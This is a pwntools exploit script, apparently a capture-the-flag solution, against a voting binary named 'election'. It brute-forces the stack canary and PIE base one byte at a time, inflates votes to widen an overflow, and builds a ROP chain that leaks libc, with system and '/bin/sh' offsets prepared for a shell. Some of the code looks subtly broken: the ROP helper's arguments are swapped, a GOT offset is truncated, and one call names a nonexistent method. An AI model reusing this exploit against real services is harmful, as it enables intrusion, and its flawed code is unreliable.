from pwn import *

context.clear(arch='x86_64')

r = process('./election')
libc = ELF('./libc.so')
elf = ELF('./election')
# r = remote('', 10180)

# some token array
token = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'

# readelf for memprotect
offset_binsh = next(libc.search('/bin/sh'))
offset_system = libc.symbols['system']
offset_puts = elf.symbols['puts']
print('offset_binsh --> ', hex(offset_binsh))
print('offset_system --> ', hex(offset_system))
print('offset_puts --> ', hex(offset_puts))

# accumulate vote for enough space to write buffer
angel_vote = 0
def vote(total_vote):
    # in voting function
    global angel_vote
    for cnt_vote in xrange(0, total_vote):
        r.sendlineafter('>', '1')
        r.sendlineafter('9]: ', '1')

        # Angelboy: Thank you!
        r.recvline()
        angel_vote += 1

    r.sendlineafter('>', '3')

# write buffer to leak canary info
def buf_canary(p):
    r.sendlineafter('>', '2')

    # The more votes.... say!
    r.sendlineafter('9]: ', '1')

    # try overwrite canary, msg[0xe0] and 8 bytes for 2 integers
    # To Angelboy:
    r.recv()
    r.sendline('A' * 0xe8 + p)

    # Done!

    # quit voting --> SIGABRT occurred
    pause()
    r.sendlineafter('>', '3')
    print(r.recv())

def hack_canary_ASLR():
    canary = ''
    canary_offset = 0xb8
    guess = 0

    buf = ''
    buf += 'A' * canary_offset

    r.sendlineafter('>', '2')
    r.sendlineafter('token: ', buf)

    print('finished regiseter a token! ')
    while len(canary) < 8:
        while guess <= 0xff:

            r.sendlineafter('>', '1')
            r.sendthen('Token: ', buf + chr(guess))

            check = r.recvline()
            if 'Invalid' not in check:
                canary += chr(guess)
                buf += chr(guess)
                guess = 0

                # logout
                r.sendlineafter('>', '3')
                break

            guess += 1


    aslr = ''
    guess = 0

    print('canary --> ', hex(u64(canary)))
    while len(aslr) < 8:
        while guess <= 0xff:

            r.sendlineafter('>', '1')
            r.sendthen('Token: ', buf + chr(guess))

            check = r.recvline()
            if 'Invalid' not in check:
                aslr += chr(guess)
                buf += chr(guess)
                guess = 0

                # logout
                r.sendlineafter('>', '3')
                break

            guess += 1

    print('ASLR base --> ', hex(u64(aslr) - 0x1140))
    return u64(canary), u64(aslr)

# craft the rop for libc base
def rop_libc_base(base, canary):
    p = ''

    # 0x00000000000011a3 : pop rdi ; ret
    pop_rdi = base + 0x00000000000011a3
    p += p64(pop_rdi)

    # 0x201fe0
    libc_start_main = base + 0x201
    p += p64(libc_start_main)

    # puts(libc_start_main)
    puts = base + offset_puts
    p += p64(puts)

    print('ROP for libc_base --> ', p)
    return p

def main():
    # find some required offset

    # brute force finding canary, and some ASLR-shit
    canary, base = hack_canary_ASLR()

    # vote for writing more buffer
    for i in xrange(0, 26):
        r.sendlineafter('>', '2')
        r.sendlineafter('token: ', token[i])
        r.sendlineafter('>', '1')
        r.sendlineafter('Token: ', token[i])

        if i < 25:
            vote(10)
        else:
            vote(5)

    # check vote result
    r.sendlineafter('>', '2')
    r.sendlineafter('token: ', token[26])
    r.sendlineafter('>', '1')
    r.sendlineafter('Token: ', token[26])
    r.sendlineafter('>', '1')
    r.recv()
    print('\n check vote result')
    print(r.recv())
    r.sendline('1')
    r.recvline()

    buf_canary(rop_libc_base(canary, base))
    r.sendlineafter('>', '3')

main()
r.sendlineafter('>', '3')
print('final')
r.close()
